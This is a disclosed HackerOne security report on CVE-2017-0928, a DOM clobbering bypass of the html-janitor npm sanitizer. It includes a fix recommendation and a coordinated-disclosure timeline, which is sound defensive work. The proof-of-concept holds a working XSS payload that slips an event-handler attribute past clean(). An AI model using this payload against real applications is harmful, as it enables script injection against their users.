---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/business-logic-errors
  - env/web
  - stack/node
substate: "resolved"
weakness: "Business Logic Errors"
enriched: true
body: true
date: 2018-02-05
submitted: 2018-01-23T12:47:54.192Z
bounty_usd: null
votes: 11
cve: "CVE-2017-0928"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bayotop"
source: "https://hackerone.com/reports/308158"
title: "[html-janitor] Bypassing sanitization using DOM clobbering"
---
# [html-janitor] Bypassing sanitization using DOM clobbering

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 11 | **Program:** Node.js third-party modules | **Disclosed:** 2018-02-05

- Report: [https://hackerone.com/reports/308158](https://hackerone.com/reports/308158)
- CWE: Business Logic Errors | CVE: CVE-2017-0928
- Submitted: 2018-01-23T12:47:54.192Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Module:**

Name: [html-janitor](https://www.npmjs.com/package/html-janitor)
Version: 2.0.2

**Summary:**

Arbitrary HTML can pass the sanitization process, which can be unexpected and dangerous (XSS) in case user-controlled input is passed to the clean function.

**Description:**

Proof of concept:

```javascript
var myJanitor = new HTMLJanitor({tags:{p:{}}});
var cleanHtml = myJanitor.clean("<form><object onmouseover=alert(document.domain) name=_sanitized></object></form>")
console.log(cleanHtml) // logs: <form><object onmouseover=alert(document.domain) name=_sanitized></object></form>
```
The following check can be leveraged to bypass the whole sanitization process:

```javascript
do {
  // Ignore nodes that have already been sanitized
  if (node._sanitized) {
      continue;
  }
...
```

As `node` is the first child in the created tree walker (i.e. in this case the `<form>` tag) `node._sanitized` will point to the inner `<object>` and the check passes.

To learn more about DOM clobbering see: https://www.youtube.com/watch?v=5W-zGBKvLxk (by Mario Heiderich)

**Recommendation:**

It should be enough to set `node._sanitized` to `false` every time a new node is being processed. 

*Note that I previously reported this issue at https://github.com/guardian/html-janitor/issues/35*

## Impact

Given the module's description I would assume it should be used to prevent XSS vulnerabilities. This is currently a very dangerous assumption given that the whole sanitization process can be bypassed.

Note that the author might have never intended to feed untrusted data into the clean() function. In that case this is *just* a regular issue. Furthermore, the fact that untrusted data is unexpected should be at least mentioned in the documentation, because other developers most certainly will use the package in such scenarios.

## Timeline

- **Report Filed**
- **2018-01-23** @lirantal: Hi Martin,

Thanks for reporting this.
I will follow-up on your input about the vulnerability to confirm it and we'll take it from there.
- **Changed Scope**
- **2018-01-23** @lirantal: I looked into it and definitely agree Martin. That poc is indeed valid, and agree with your comment regarding putting some disclaimer even if the author never intended for untrusted input to go in. 

I invited Oliver here, who worked on the repo, and hopefully he will be able to help out.
Will also try to reach out to people at The Guardian organization just-incase.
- **Report Severity Updated**
- **Report Triaged**
- **Cve Id Added**
- **2018-01-30** @lirantal: We didn't receive any feedback for a week now on this report, and also the security issue was already reported publicly in the git repository for several months now without attention.

If by weekend we won't get any response on the report I'll go ahead with a public disclosure of both security issues reported around this package.
- **2018-01-31** @bayotop: Sounds good.
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
